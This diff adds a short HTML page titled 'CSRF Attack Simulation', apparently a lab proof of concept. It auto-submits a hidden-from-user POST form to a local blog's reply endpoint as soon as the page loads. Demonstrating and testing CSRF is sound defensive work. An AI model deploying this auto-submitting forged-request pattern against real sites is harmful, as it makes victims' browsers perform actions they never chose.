@@ -1,0 +1,13 @@
+<html>
+  <body>
+    <h1>CSRF Attack Simulation</h1>
+    <form action="http://localhost:5000/Blog/Reply/1" method="POST">
+      <textarea name="contents">I am exploiting a CSRF vulnerability!</textarea>
+      <input type="submit" value="Submit Response">
+    </form>
+    <script>
+      // Automatically submit the form when the page loads
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
